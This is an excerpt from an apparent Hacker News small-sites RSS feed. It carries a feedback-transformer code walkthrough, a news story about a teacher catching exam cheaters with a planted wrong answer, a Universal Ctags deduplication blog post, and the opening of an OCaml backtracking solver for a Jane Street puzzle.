                <div><pre><span>140</span>        <span>scores</span> <span>=</span> <span>self</span><span>.</span><span>get_scores</span><span>(</span><span>query</span><span>,</span> <span>key</span><span>)</span></pre></div>
            </div>
        </div>
    <div id="section-22">
            <div>
                
                <p>Scale scores $\frac{1}{\sqrt{d_k}}$</p>
            </div>
            
        </div>
    <div id="section-23">
            
            <div>
                <div><pre><span>146</span>        <span>attn</span> <span>=</span> <span>self</span><span>.</span><span>softmax</span><span>(</span><span>scores</span><span>)</span></pre></div>
            </div>
        </div>
    <div id="section-24">
            
            <div>
                <div><pre><span>149</span>        <span>attn</span> <span>=</span> <span>self</span><span>.</span><span>dropout</span><span>(</span><span>attn</span><span>)</span></pre></div>
            </div>
        </div>
    <div id="section-25">
            
            <div>
                <div><pre><span>152</span>        <span>x</span> <span>=</span> <span>torch</span><span>.</span><span>einsum</span><span>(</span><span>"jbh,jbhd-&gt;bhd"</span><span>,</span> <span>attn</span><span>,</span> <span>value</span><span>)</span></pre></div>
            </div>
        </div>
    <div id="section-26">
            <div>
                
                <p>Concatenate multiple heads</p>
            </div>
            <div>
                <div><pre><span>155</span>        <span>x</span> <span>=</span> <span>x</span><span>.</span><span>reshape</span><span>(</span><span>x</span><span>.</span><span>shape</span><span>[</span><span>0</span><span>],</span> <span>-</span><span>1</span><span>)</span></pre></div>
            </div>
        </div>
    <div id="section-27">
            
            <div>
                <div><pre><span>158</span>        <span>return</span> <span>self</span><span>.</span><span>output</span><span>(</span><span>x</span><span>)</span></pre></div>
            </div>
        </div>
    <div id="section-28">
        <div>
                
                <h2>Feedback Transformer Layer</h2>
<p>This implements a single transformer layer in the feedback transformer.</p>
            </div>
            <div>
                <div><pre><span>161</span><span>class</span> <span>FeedbackTransformerLayer</span><span>(</span><span>Module</span><span>):</span></pre></div>
            </div>
        </div>
    <div id="section-29">
        <div>
                
                <ul>
<li><code>d_model</code> is the number of features in the transformer</li>
<li><code>attn</code> is the feedback attention module</li>
<li><code>feed_forward</code> is the position-wise feed forward layer</li>
<li><code>dropout_prob</code> is the dropout probability for dropout layers after attention and feed-forward</li>
</ul>
            </div>
            <div>
                <div><pre><span>168</span>    <span>def</span> <span>__init__</span><span>(</span><span>self</span><span>,</span> <span>*</span><span>,</span>
<span>169</span>                 <span>d_model</span><span>:</span> <span>int</span><span>,</span>
<span>170</span>                 <span>attn</span><span>:</span> <span>FeedbackAttention</span><span>,</span>
<span>171</span>                 <span>feed_forward</span><span>:</span> <span>FeedForward</span><span>,</span>
<span>172</span>                 <span>dropout_prob</span><span>:</span> <span>float</span><span>):</span></pre></div>
            </div>
        </div>
    
    <div id="section-31">
            <div>
                
                <p>Transformer size $d_{model}$</p>
            </div>
            
        </div>
    <div id="section-32">
            
            <div>
                <div><pre><span>183</span>        <span>self</span><span>.</span><span>attn</span> <span>=</span> <span>attn</span>
<span>184</span>        <span>self</span><span>.</span><span>feed_forward</span> <span>=</span> <span>feed_forward</span>
<span>185</span>        <span>self</span><span>.</span><span>dropout</span> <span>=</span> <span>nn</span><span>.</span><span>Dropout</span><span>(</span><span>dropout_prob</span><span>)</span></pre></div>
            </div>
        </div>
    <div id="section-33">
            
            <div>
                <div><pre><span>188</span>        <span>self</span><span>.</span><span>norm_self_attn</span> <span>=</span> <span>nn</span><span>.</span><span>LayerNorm</span><span>([</span><span>d_model</span><span>])</span>
<span>189</span>        <span>self</span><span>.</span><span>norm_ff</span> <span>=</span> <span>nn</span><span>.</span><span>LayerNorm</span><span>([</span><span>d_model</span><span>])</span></pre></div>
            </div>
        </div>
    <div id="section-34">
            
            <div>
                <div><pre><span>191</span>    <span>def</span> <span>__call__</span><span>(</span><span>self</span><span>,</span> <span>*</span><span>,</span>
<span>192</span>                 <span>x</span><span>:</span> <span>torch</span><span>.</span><span>Tensor</span><span>,</span>
<span>193</span>                 <span>mem</span><span>:</span> <span>Optional</span><span>[</span><span>torch</span><span>.</span><span>Tensor</span><span>]):</span></pre></div>
            </div>
        </div>
    
    <div id="section-36">
            <div>
                
                <p>Normalize the vectors before doing self attention</p>
            </div>
            <div>
                <div><pre><span>197</span>            <span>z</span> <span>=</span> <span>self</span><span>.</span><span>norm_self_attn</span><span>(</span><span>x</span><span>)</span></pre></div>
            </div>
        </div>
    <div id="section-37">
            <div>
                
                <p>Run through self attention, i.e. keys and values are from self</p>
            </div>
            <div>
                <div><pre><span>199</span>            <span>self_attn</span> <span>=</span> <span>self</span><span>.</span><span>attn</span><span>(</span><span>query</span><span>=</span><span>z</span><span>,</span> <span>key</span><span>=</span><span>mem</span><span>,</span> <span>value</span><span>=</span><span>mem</span><span>)</span></pre></div>
            </div>
        </div>
    <div id="section-38">
            <div>
                
                <p>Add the self attention results</p>
            </div>
            <div>
                <div><pre><span>201</span>            <span>x</span> <span>=</span> <span>x</span> <span>+</span> <span>self</span><span>.</span><span>dropout</span><span>(</span><span>self_attn</span><span>)</span></pre></div>
            </div>
        </div>
    <div id="section-39">
            <div>
                
                <p>Normalize for feed-forward</p>
            </div>
            
        </div>
    <div id="section-40">
            <div>
                
                <p>Pass through the feed-forward network</p>
            </div>
            <div>
                <div><pre><span>206</span>        <span>ff</span> <span>=</span> <span>self</span><span>.</span><span>feed_forward</span><span>(</span><span>z</span><span>)</span></pre></div>
            </div>
        </div>
    <div id="section-41">
            <div>
                
                <p>Add the feed-forward results back</p>
            </div>
            <div>
                <div><pre><span>208</span>        <span>x</span> <span>=</span> <span>x</span> <span>+</span> <span>self</span><span>.</span><span>dropout</span><span>(</span><span>ff</span><span>)</span></pre></div>
            </div>
        </div>
    
    <div id="section-43">
        <div>
                
                <h2>Feedback Transformer Module</h2>
            </div>
            <div>
                <div><pre><span>214</span><span>class</span> <span>FeedbackTransformer</span><span>(</span><span>Module</span><span>):</span></pre></div>
            </div>
        </div>
    <div id="section-44">
        <div>
                
                <ul>
<li><code>layer</code> is the feedback transformer layer, which we clone for each layer</li>
<li><code>n_layers</code> is the number of layers in the transformer</li>
</ul>
            </div>
            <div>
                <div><pre><span>219</span>    <span>def</span> <span>__init__</span><span>(</span><span>self</span><span>,</span> <span>layer</span><span>:</span> <span>FeedbackTransformerLayer</span><span>,</span> <span>n_layers</span><span>:</span> <span>int</span><span>):</span></pre></div>
            </div>
     …</div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://lab-ml.com/labml_nn/transformers/feedback/">https://lab-ml.com/labml_nn/transformers/feedback/</a></em></p>]]>
            </description>
            <link>https://lab-ml.com/labml_nn/transformers/feedback/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25713987</guid>
            <pubDate>Sun, 10 Jan 2021 12:22:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Teacher creates ingenious exam question to find cheaters and catches 14 students]]>
            </title>
            <description>
<![CDATA[
Score 83 | Comments 93 (<a href="https://news.ycombinator.com/item?id=25713861">thread link</a>) | @ColinWright
<br/>
January 10, 2021 | https://www.irishmirror.ie/news/weird-news/teacher-creates-ingenious-exam-question-23228848 | <a href="https://web.archive.org/web/*/https://www.irishmirror.ie/news/weird-news/teacher-creates-ingenious-exam-question-23228848">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody"><form data-mod="skinnySignup" data-json="{&quot;mailingListId&quot;:&quot;37995&quot;,&quot;displayName&quot;:&quot;daily&quot;,&quot;callToAction&quot;:&quot;<p>Get all the very latest news in Ireland straight to your email every single day</p>&quot;,&quot;buttonText&quot;:&quot;Sign up!&quot;,&quot;contentId&quot;:6321963,&quot;newsletterImage&quot;:&quot;https://i2-prod.irishmirror.ie/incoming/article22352084.ece/BINARY/1_Covid-19-Scenes90466558.jpg&quot;,&quot;endpointUrl&quot;:&quot;https://response.pure360.com/interface/list.php&quot;,&quot;profile&quot;:&quot;Irish_Mirror&quot;,&quot;isPure360NewsLetter&quot;:true,&quot;pure360MailingListId&quot;:&quot;Irish Mirror - Daily Newsletter&quot;,&quot;newsletterSiteName&quot;:&quot;Irish Mirror&quot;}"><div><div><div><p><span><span>When you subscribe we will use the information you provide to send you these newsletters. Sometimes theyâ€™ll include recommendations for other related newsletters or services we offer. Our</span><a href="https://www.irishmirror.ie/privacy-notice/">Privacy Notice</a><span>explains more about how we use your data, and your rights. You can unsubscribe at any time.</span></span></p></div></div><p><span>Invalid Email</span></p></div></form><!-- Article Start--><p>Students who assumed their teacher 'on the older side' wouldn't be familiar with the latest cheating methods were caught red handed when he devised a brilliant method to catch them out.</p> <p>A pupil in the engineering class explained that when they all sat down to take their final exam, about half the class left the room to use the bathroom during the test - far more than the usual.</p> <p>The student said they assumed the vast majority were looking up answers on their phone, which 'irritated me' but they stayed focused and made their way through the paper.</p> <p>After leaving the exam hall, the pupil remembered there was one particular question that wasn't related to what they had all been taught in class, which had two parts - the Mirror UK reports.</p> <p>Part A was 'fairly easy' but they had no idea how to do part B, so they simply left it blank as it only accounted for 5 marks out of 100.</p> <figure data-mod="image" itemprop="image" itemscope="" itemtype="http://schema.org/ImageObject">
<meta itemprop="url" content="https://i2-prod.mirror.co.uk/incoming/article11553649.ece/ALTERNATES/s615b/0_Tests-on-table.jpg">
<meta itemprop="width" content="615">
<meta itemprop="height" content="410">
<div>

<p><img data-src="https://i2-prod.mirror.co.uk/incoming/article11553649.ece/ALTERNATES/s615b/0_Tests-on-table.jpg" alt="" content="https://i2-prod.mirror.co.uk/incoming/article11553649.ece/ALTERNATES/s615b/0_Tests-on-table.jpg" src="https://i2-prod.mirror.co.uk/incoming/article11553649.ece/ALTERNATES/s615b/0_Tests-on-table.jpg">
</p>
</div>
<figcaption>
<span itemprop="author"> (Image: Tetra images RF)</span>
</figcaption>
</figure> <p>When all the exams had been marked, their teacher sent all the university students an email to explain his diabolical plan to catch out those who had given themselves some outside help.</p> <p>Many of the pupils used the internet to find answers to exam and homework questions.</p> <p>Their teacher decided to use it against them after becoming fed up with students using the bathroom as an excuse to look up answers on their phones.</p> <section data-embed-group="read-more" data-embed-items="2" data-ad-dockable="true">   </section> <p>The student wrote on Reddit: "He purposely made part B impossible to solve, and about a month before the final he got a teaching assistant to ask the exact question [online], which was distinctly worded to be unique.</p> <p>"He then created his own account and answered the question with a bulls*** solution that seems right at first glance but is actually fundamentally flawed and very unlikely that someone would make the same assumptions and mistakes independently."</p> <p>From the 99 exams handed in, 14 of them fell for the trick and gave the exact answer their own teacher had posted online.</p> <p>All were given an overall score of zero and reported to the university for violating the academic honor pledge they had signed.</p> <p>Their names were also circulated to all the other teachers in the department as known cheaters - and all the other students who hadn't cheated were given full marks for the bogus question.</p> <p>Others were impressed with cunning plan, with one replying: "This is Amazing! I've seen some stories like this and it always makes me glad I don't use [the internet] for tests.</p> <p>"Honestly if you're cheating on a proctored test you deserve to get caught. Study like everyone else."</p> <p>A second wrote: "Honey pot the cheating site. Genius!"</p><!-- Article End--></div></div>]]>
            </description>
            <link>https://www.irishmirror.ie/news/weird-news/teacher-creates-ingenious-exam-question-23228848</link>
            <guid isPermaLink="false">hacker-news-small-sites-25713861</guid>
            <pubDate>Sun, 10 Jan 2021 12:03:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Using flamegraphs to read big HN threads]]>
            </title>
            <description>
<![CDATA[
Score 175 | Comments 33 (<a href="https://news.ycombinator.com/item?id=25713858">thread link</a>) | @trungdq88
<br/>
January 10, 2021 | https://trungdq88.github.io/hn-big-threads/index.html | <a href="https://web.archive.org/web/*/https://trungdq88.github.io/hn-big-threads/index.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      
      <p>
        Loading... https://news.ycombinator.com/item?id=25706993
      </p>
    </div></div>]]>
            </description>
            <link>https://trungdq88.github.io/hn-big-threads/index.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25713858</guid>
            <pubDate>Sun, 10 Jan 2021 12:03:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Surprising Ctags Behaviour]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25713778">thread link</a>) | @todsacerdoti
<br/>
January 10, 2021 | https://joshleeb.com/posts/surprising-ctags.html | <a href="https://web.archive.org/web/*/https://joshleeb.com/posts/surprising-ctags.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><article><p>Published
<time datetime="2021-01-10">2021-01-10</time>
on <a href="https://joshleeb.com/">Joshleeb's blog</a></p><p>Today I came across some interesting behaviour implemented by <code>ctags</code> (specifically <a href="https://github.com/universal-ctags/ctags">Universal Ctags</a>) with the way some tag entries are handled. At first I was surprised. Then thinking about a bit more I can understand why. But still, I feel there must be a better way.</p><p>Let’s take a look at some Rust code.</p><div><pre><code data-lang="rust"><span>// lib.rs
</span><span></span><span>struct</span> <span>Foo</span>;<span>
</span><span>
</span><span></span><span>impl</span><span> </span>Debug<span> </span><span>for</span><span> </span>Foo<span> </span>{<span>
</span><span>    </span><span>fn</span> <span>fmt</span>(<span>&amp;</span><span>self</span>,<span> </span>f: <span>&amp;</span><span>mut</span><span> </span>fmt::Formatter<span>&lt;</span><span>'_</span><span>&gt;</span>)<span> </span>-&gt; <span>fmt</span>::<span>Result</span><span> </span>{<span>
</span><span>        </span>...<span>
</span><span>    </span>}<span>
</span><span></span>}<span>
</span><span>
</span><span></span><span>struct</span> <span>Bar</span>;<span>
</span><span>
</span><span></span><span>impl</span><span> </span>Debug<span> </span><span>for</span><span> </span>Bar<span> </span>{<span>
</span><span>    </span><span>fn</span> <span>fmt</span>(<span>&amp;</span><span>self</span>,<span> </span>f: <span>&amp;</span><span>mut</span><span> </span>fmt::Formatter<span>&lt;</span><span>'_</span><span>&gt;</span>)<span> </span>-&gt; <span>fmt</span>::<span>Result</span><span> </span>{<span>
</span><span>        </span>...<span>
</span><span>    </span>}<span>
</span><span></span>}<span>
</span></code></pre></div><p>Looks pretty straight forward. We have two structs <code>Foo</code> and <code>Bar</code>, both of which implement the <code>Debug</code> trait. Now let’s see what happens when we run <code>ctags</code>.</p><div><pre><code data-lang="txt">$ ctags --fields=+K lib.rs
Bar	lib.rs	/^impl Debug for Bar {$/;"	implementation
Bar	lib.rs	/^struct Bar;$/;"	struct
Foo	lib.rs	/^impl Debug for Foo {$/;"	implementation
Foo	lib.rs	/^struct Foo;$/;"	struct
fmt	lib.rs	/^    fn fmt(&amp;self, &amp;mut fmt::Formatter&lt;'_&gt;) -&gt; fmt::Result {$/;"	method	implementation:Bar
fmt	lib.rs	/^    fn fmt(&amp;self, &amp;mut fmt::Formatter&lt;'_&gt;) -&gt; fmt::Result {$/;"	method	implementation:Foo
</code></pre></div><p>All appears normal. We see our two structs, implementations, and methods appearing as expected.</p><p>The <code>--fields=+K</code> flag doesn’t do anything unexpected either. It simply changes the output to emit the long symbol kind <code>struct</code> rather than the shorter <code>s</code>.</p><p>Now let’s extend <code>lib.rs</code> with some more code.</p><div><pre><code data-lang="rust"><span>impl</span><span> </span>Display<span> </span><span>for</span><span> </span>Bar<span> </span>{<span>
</span><span>    </span><span>fn</span> <span>fmt</span>(<span>&amp;</span><span>self</span>,<span> </span>f: <span>&amp;</span><span>mut</span><span> </span>fmt::Formatter<span>&lt;</span><span>'_</span><span>&gt;</span>)<span> </span>-&gt; <span>fmt</span>::<span>Result</span><span> </span>{<span>
</span><span>        </span>...<span>
</span><span>    </span>}<span>
</span><span></span>}<span>
</span></code></pre></div><p>What do you expect to see in the output from <code>ctags</code>? I can tell you that I was expecting to see an additional implementation and an additional method reflected in the generated tags.</p><div><pre><code data-lang="txt">$ ctags --fields=+K lib.rs
Bar	lib.rs	/^impl Debug for Bar {$/;"	implementation
Bar	lib.rs	/^impl Display for Bar {$/;"	implementation
Bar	lib.rs	/^struct Bar;$/;"	struct
Foo	lib.rs	/^impl Debug for Foo {$/;"	implementation
Foo	lib.rs	/^struct Foo;$/;"	struct
fmt	lib.rs	/^    fn fmt(&amp;self, &amp;mut fmt::Formatter&lt;'_&gt;) -&gt; fmt::Result {$/;"	method	implementation:Bar
fmt	lib.rs	/^    fn fmt(&amp;self, &amp;mut fmt::Formatter&lt;'_&gt;) -&gt; fmt::Result {$/;"	method	implementation:Foo
</code></pre></div><p>There we see the three implementations, but only two <code>fmt</code> methods.</p><p>When I saw this, my first thought was to try and figure out which of the two <code>fmt</code> methods implemented for <code>Bar</code> were being picked up, and which one was being skipped by <code>ctags</code>. To do this, we can set the <code>--fields</code> flag to include line numbers.</p><div><pre><code data-lang="txt">$ ctags --fields=+Kn lib.rs
Bar	lib.rs	/^impl Debug for Bar {$/;"	implementation	line:11
Bar	lib.rs	/^impl Display for Bar {$/;"	implementation	line:17
Bar	lib.rs	/^struct Bar;$/;"	struct	line:9
Foo	lib.rs	/^impl Debug for Foo {$/;"	implementation	line:3
Foo	lib.rs	/^struct Foo;$/;"	struct	line:1
fmt	lib.rs	/^    fn fmt(&amp;self, &amp;mut fmt::Formatter&lt;'_&gt;) -&gt; fmt::Result {$/;"	method	line:12	implementation:Bar
fmt	lib.rs	/^    fn fmt(&amp;self, &amp;mut fmt::Formatter&lt;'_&gt;) -&gt; fmt::Result {$/;"	method	line:18	implementation:Bar
fmt	lib.rs	/^    fn fmt(&amp;self, &amp;mut fmt::Formatter&lt;'_&gt;) -&gt; fmt::Result {$/;"	method	line:4	implementation:Foo
</code></pre></div><p>Alright, so now we are getting all three implementations, and all three <code>fmt</code> methods.</p><p>Looking at the two <code>method</code> lines for <code>implementation:Bar</code> we can see the only difference is the line number. So it appears that <code>ctags</code> will deduplicate tag entries that will appear the same when output, even if each tag entry refers to a distinct symbol.</p><p>Checking the <a href="https://linux.die.net/man/1/ctags">man page</a>, I didn’t find this behaviour documented. But there was something useful for the <code>--excmd</code> flag. Here we see that running <code>ctags --excmd=number</code> will <em>“Use only line numbers in the tag file for locating tags.”</em> And since our second run of <code>ctags</code> included line numbers there seems to be some relevance.</p><p>Reading on we see some advantages listed for including line numbers. Namely the fourth point.</p><blockquote><p>Retains separate entries in the tag file for lines which are identical in content. In pattern mode, duplicate entries are dropped because the search patterns they generate are identical, making the duplicate entries useless.</p></blockquote><p>On the surface this seems reasonable. But consider the implications for an editor (or plugin) that reads the generated tags and allows the user to jump to a specific symbol in the codebase. The tag file may seem like a set of all symbols in the codebase, but treating it as such may skip over some symbols.</p><p>Instead, what we have is a file containing the patterns of all symbols that ctags picked up. So the editor should, for each file, iterate over each pattern ctags captures for that file, and grep for the symbols to then display to the user. And, naively, this would have to happen each time the user wanted to jump to another symbol in the codebase since files can change all the time.</p><p>Alright, so that seems like a non-obvious corner case for someone wanting to work with <code>ctags</code> to have to think about. There is also a lot of unnecessary work the editor has to do each time we want to jump to a symbol. But we know we can have <code>ctags</code> output the set of all symbols by including line numbers so let’s consider that approach.</p><p>When using line numbers, rather than patterns, jumping to a symbol becomes trivial to implement and much more efficient. We could even just fuzzy match on the tags file itself to select a particular symbol, and then jump to the file and the line included in the tag entry. But, this does have a pretty significant drawback (also referenced in the man page).</p><blockquote><p>changes to the source files can cause the line numbers recorded in the tag file to no longer correspond to the lines in the source file, causing jumps to some tags to miss the target definition by one or more lines. Basically, this option is best used when the source code to which it is applied is not subject to change.</p></blockquote><p>Clearly then, this approach isn’t great either. Unless…</p><p><code>ctags</code> itself isn’t particularly slow, but it isn’t <em>blazingly</em> fast either. And given that <a href="https://github.com/universal-ctags/ctags/issues/761">it runs entirely on a single thread</a>, and symbol indexing is an embarrassingly parallel problem, there seems to be an opportunity for a significant speed up.</p><p>So, if we index symbols by file path and line number, and are able to reindex fast enough that it becomes reasonable to do so on each file change, then we can avoid the drawbacks mentioned in the man page. Unfortunately though, this doesn’t get rid of another (very similar) drawback with indexing by line number.</p><p>An interesting benefit of indexing with patterns is that even for unsaved buffers, the editor will be able to jump to the correct location for a symbol. And only symbols added prior to saving the file won’t be picked up. But unless the file is saved, with our new approach we won’t be aware of any changes and so the line numbers are likely to get out of sync.</p><p>It seems improving on this will require some more thought. Perhaps an API akin to the <a href="https://microsoft.github.io/language-server-protocol/specifications/specification-current/#textDocument_didOpen">DidOpenTextDocument Notification</a> in the Language Server Protocol spec…</p></article></div></div>]]>
            </description>
            <link>https://joshleeb.com/posts/surprising-ctags.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25713778</guid>
            <pubDate>Sun, 10 Jan 2021 11:51:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Solving the Jane Street Puzzle of Dec 2020 – Backtracking with OCaml]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25713770">thread link</a>) | @bosveld
<br/>
January 10, 2021 | https://willemhoek.com/b/howto-solve-jane-street-puzzle-dec-2020-backtracking-with-ocaml | <a href="https://web.archive.org/web/*/https://willemhoek.com/b/howto-solve-jane-street-puzzle-dec-2020-backtracking-with-ocaml">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      
      <h2><a href="https://willemhoek.com/">Willem Hoek</a>&nbsp; » &nbsp;Solving the Jane Street puzzle of Dec 2020 - Backtracking with OCaml</h2>
      
      
<p>Jan 10, 2021</p>

<p>
<img src="https://willemhoek.com/images/Nighthawks_by_Edward_Hopper_1942.jpg"><br>
Nighthawks, Edward Hopper, 1942
</p>

<p><br>
Every month Jane Street Capital publishes a puzzle on their website. This was the <a href="https://www.janestreet.com/puzzles/twenty-four-seven-2-by-2-2/">puzzle</a> and <a href="https://www.janestreet.com/puzzles/solutions/december-2020-solution/">solution</a> for December 2020 [1].</p>

<blockquote>
  <p>Each of the grids below is incomplete. Place numbers in some of the empty cells so that in total each grid’s interior contains one 1, two 2’s, etc., up to seven 7’s. Furthermore, each row and column within each grid must contain exactly 4 numbers which sum to 20. Finally, the numbered cells must form a connected region, but every 2-by-2 subsquare in the completed grid must contain at least one empty cell.</p>

  <p>Some numbers have been placed inside each grid. Additionally, some blue numbers have been placed outside of the grids. These blue numbers indicate the first value seen in the corresponding row or column when looking into the grid from that location.</p>

  <p>Once each of the grids is complete, create a 7-by-7 grid by “adding” the four grids’ interiors together (as if they were 7-by-7 matrices). The answer to this month’s puzzle is the sum of the squares of the values in this final grid.</p>

  <p><img width="500" src="https://willemhoek.com/images/janestreet-dec2020.png"></p>
</blockquote>

<h2 id="approach-followed">Approach followed</h2>

<p>I started to solve it with pen and paper but realised it will take way to long - probably quicker to do it programmatically. The puzzles look like a Suduko puzzle.  <a href="https://www3.cs.stonybrook.edu/~algorith/video-lectures/2007/lecture15.pdf">Backtracking</a> [3] is one of the widely used methods to solve Soduko – so I decided to use that.</p>

<p>Pseudo code for recursive backtracking function – this is the <code>solve</code> function in code below.</p>

<div><div><pre><code>function: solve (grid, node)

if at a solution – return success (true)
else for every possible choice at node
   if valid choice then solve for next step along path
     if successful return success (true)
   else restore the state as at beginning of loop
If no solution, report failure  (false)
</code></pre></div></div>

<h2 id="why-use-ocaml-and-not-python">Why use OCaml and not Python?</h2>

<p>I use <a href="https://www.python.org/">Python</a> for my day-to-day automation tasks but decided to use <a href="https://ocaml.org/">OCaml</a> [4] for this exercise.</p>

<p>Main reasons:</p>

<ul>
  <li><strong>Speed</strong>:  Python is slow. OCaml runtimes can easily be 50-100x faster than Python.  Since I was doing this very quickly and using a brute force method, I knew that runtime might be an issue.</li>
  <li><strong>Easy to use</strong>:  OCaml is a functional language but also provides great support for imperative programming which is closer to Python</li>
  <li><strong>Variety</strong>: Knowing multiple languages widens your thought process and makes you a well-rounded developer</li>
</ul>

<p>Also:</p>

<ul>
  <li><strong>Scope</strong>: Python is dynamically scoped. OCaml is strong static typing with type inference. This results in slightly longer coding time than in Python but I found that a lot less debugging was required</li>
  <li><strong>Portable / Easy deploy</strong>:  I developed, compiled and tested the program on my Windows laptop and was able recompile and execute the final version on a Linux server. Similar to Python it works well on Linux, Windows and other platforms</li>
</ul>

<p>If you are not familiar with OCaml - you may want to have look at this great talk by Yaron Minsky of Jane Street.</p>

<p>
<a href="https://www.youtube.com/watch?v=v1CmGbOGb2I">
<kbd><img width="500" src="https://willemhoek.com/images/why_ocaml.jpg"></kbd>
</a>
</p>

<h2 id="lots-of-room-for-improvement">Lots of room for improvement</h2>

<p>The program was cobbled together very quickly to solve the problem ASAP.  The code and patterns used were not elegant, example:</p>

<ul>
  <li>I did not try to prune branches (remove values) when doing the backtracking - hence the fairly long runtimes</li>
  <li>The path (nodes) followed in grid was manually selected, it should be done programmatically to ensure most constrainted options are explored first</li>
  <li>The selection of possible entries for a particular node does not take into account other entries in row/column</li>
  <li>No benchmarking or profiling was done to speed up the code</li>
  <li>Better data structures can be used, I don’t think using records was a good choice to define the input data</li>
  <li>Did not follow <a href="https://en.wikipedia.org/wiki/Don't_repeat_yourself">DRY</a> (“do not repeat yourself”) principles, e.g. the <code>check_top</code>, <code>check_bottom</code>, <code>check_left</code>, <code>check_right</code> functions should have been combined in one function</li>
</ul>

<div><div><pre><code><span>(***************** START helper functions *************************)</span>

<span>(* Convert Option to Integer. Default is 0 *)</span>
<span>(* https://github.com/ocaml/ocaml/blob/trunk/stdlib/option.ml *)</span>
<span>let</span> <span>oval</span> <span>=</span> <span>function</span>
  <span>|</span> <span>Some</span> <span>x</span> <span>-&gt;</span> <span>x</span>
  <span>|</span> <span>None</span> <span>-&gt;</span> <span>0</span>

<span>(* print contents of matrix - 2-dim Array *)</span>
<span>let</span> <span>print_matrix</span> <span>matrix</span> <span>=</span>
  <span>let</span> <span>dimy</span> <span>=</span> <span>Array</span><span>.</span><span>length</span> <span>matrix</span> <span>in</span>
  <span>let</span> <span>dimx</span> <span>=</span> <span>Array</span><span>.</span><span>length</span> <span>matrix</span><span>.</span><span>(</span><span>0</span><span>)</span> <span>in</span>
  <span>Printf</span><span>.</span><span>printf</span> <span>"</span><span>\n</span><span>%!"</span><span>;</span>
  <span>for</span> <span>y</span> <span>=</span> <span>0</span> <span>to</span> <span>(</span><span>dimy</span> <span>-</span> <span>1</span><span>)</span> <span>do</span>
    <span>for</span> <span>x</span> <span>=</span> <span>0</span> <span>to</span> <span>(</span><span>dimx</span> <span>-</span> <span>1</span><span>)</span> <span>do</span>
      <span>let</span> <span>z</span> <span>=</span> <span>oval</span> <span>matrix</span><span>.</span><span>(</span><span>y</span><span>)</span><span>.</span><span>(</span><span>x</span><span>)</span> <span>in</span>
      <span>Printf</span><span>.</span><span>printf</span> <span>"%i "</span> <span>z</span>
    <span>done</span><span>;</span>
    <span>Printf</span><span>.</span><span>printf</span> <span>"</span><span>\n</span><span>%!"</span>
  <span>done</span><span>;</span>
  <span>Printf</span><span>.</span><span>printf</span> <span>"</span><span>\n</span><span>%!"</span>

<span>(* make a copy of a int array array - 2-dim Array *)</span>
<span>let</span> <span>copy_matrix</span> <span>matrix</span> <span>=</span>
  <span>let</span> <span>dimy</span> <span>=</span> <span>Array</span><span>.</span><span>length</span> <span>matrix</span> <span>in</span>
  <span>let</span> <span>dimx</span> <span>=</span> <span>Array</span><span>.</span><span>length</span> <span>matrix</span><span>.</span><span>(</span><span>0</span><span>)</span> <span>in</span>
  <span>let</span> <span>m</span> <span>=</span> <span>Array</span><span>.</span><span>make_matrix</span> <span>dimy</span> <span>dimx</span> <span>0</span> <span>in</span>
  <span>for</span> <span>y</span> <span>=</span> <span>0</span> <span>to</span> <span>(</span><span>dimy</span> <span>-</span> <span>1</span><span>)</span> <span>do</span>
    <span>for</span> <span>x</span> <span>=</span> <span>0</span> <span>to</span> <span>(</span><span>dimx</span> <span>-</span> <span>1</span><span>)</span> <span>do</span>
      <span>m</span><span>.</span><span>(</span><span>y</span><span>)</span><span>.</span><span>(</span><span>x</span><span>)</span> <span>&lt;-</span> <span>matrix</span><span>.</span><span>(</span><span>y</span><span>)</span><span>.</span><span>(</span><span>x</span><span>)</span>
    <span>done</span>
  <span>done</span><span>;</span>
  <span>m</span>

<span>(* remove consecutive duplicates from a list                              *)</span>
<span>(* https://dev.realworldocaml.org/lists-and-patterns.html#scrollNav-6-1   *)</span>
<span>let</span> <span>rec</span> <span>destutter</span> <span>=</span> <span>function</span>
  <span>|</span> <span>[]</span> <span>|</span> <span>[</span><span>_</span><span>]</span> <span>as</span> <span>l</span> <span>-&gt;</span> <span>l</span>
  <span>|</span> <span>hd</span> <span>::</span> <span>(</span><span>hd'</span> <span>::</span> <span>_</span> <span>as</span> <span>tl</span><span>)</span> <span>when</span> <span>hd</span> <span>=</span> <span>hd'</span> <span>-&gt;</span> <span>destutter</span> <span>tl</span>
  <span>|</span> <span>hd</span> <span>::</span> <span>tl</span> <span>-&gt;</span> <span>hd</span> <span>::</span> <span>destutter</span> <span>tl</span>

<span>(* remove nth item from a list *)</span>
<span>let</span> <span>rec</span> <span>remove_at</span> <span>n</span> <span>=</span> <span>function</span>
  <span>|</span> <span>[]</span> <span>-&gt;</span> <span>[]</span>
  <span>|</span> <span>h</span> <span>::</span> <span>t</span> <span>-&gt;</span> <span>if</span> <span>n</span> <span>=</span> <span>0</span> <span>then</span> <span>t</span> <span>else</span> <span>h</span> <span>::</span> <span>remove_at</span> <span>(</span><span>n</span><span>-</span><span>1</span><span>)</span> <span>t</span>

<span>(* remove first item with value v from a list *)</span>
<span>let</span> <span>rec</span> <span>remove_val</span> <span>v</span> <span>=</span> <span>function</span>
  <span>|</span> <span>[]</span> <span>-&gt;</span> <span>[]</span>
  <span>|</span> <span>h</span> <span>::</span> <span>t</span> <span>-&gt;</span> <span>if</span> <span>h</span> <span>=</span> <span>v</span> <span>then</span> <span>t</span> <span>else</span> <span>h</span> <span>::</span> <span>remove_val</span> <span>v</span> <span>t</span>

<span>(* convert matrix containing numbers to Some numbers and 0 is None *)</span>
